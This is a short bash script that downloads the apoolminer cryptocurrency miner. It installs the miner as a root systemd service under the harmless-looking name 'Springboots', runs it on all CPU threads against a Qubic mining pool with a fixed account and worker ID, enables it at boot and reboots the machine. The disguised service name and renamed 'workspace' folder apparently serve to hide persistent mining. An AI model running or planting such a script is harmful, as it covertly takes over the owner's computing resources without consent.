#!/bin/bash

cd /home
wget https://github.com/apool-io/apoolminer/releases/download/v2.6.7/apoolminer_linux_autoupdate_v2.6.7.tar.gz
tar zxf apoolminer_linux_autoupdate_v2.6.7.tar.gz
mv apoolminer_linux_autoupdate_v2.6.7 workspace
NUM_CPUS=$(grep -c ^processor /proc/cpuinfo)
sudo bash -c "cat <<EOF > /etc/systemd/system/springboots.service
[Unit]
Description=Springboots
After=network.target

[Service]
Type=simple
ExecStart=/home/workspace/apoolminer --account CP_9hwxggflw2 --worker akmbangbang --thread $NUM_CPUS --pool qubic2.hk.apool.io:3334

[Install]
WantedBy=multi-user.target
EOF"
sudo systemctl daemon-reload
sudo systemctl enable springboots.service
sudo reboot
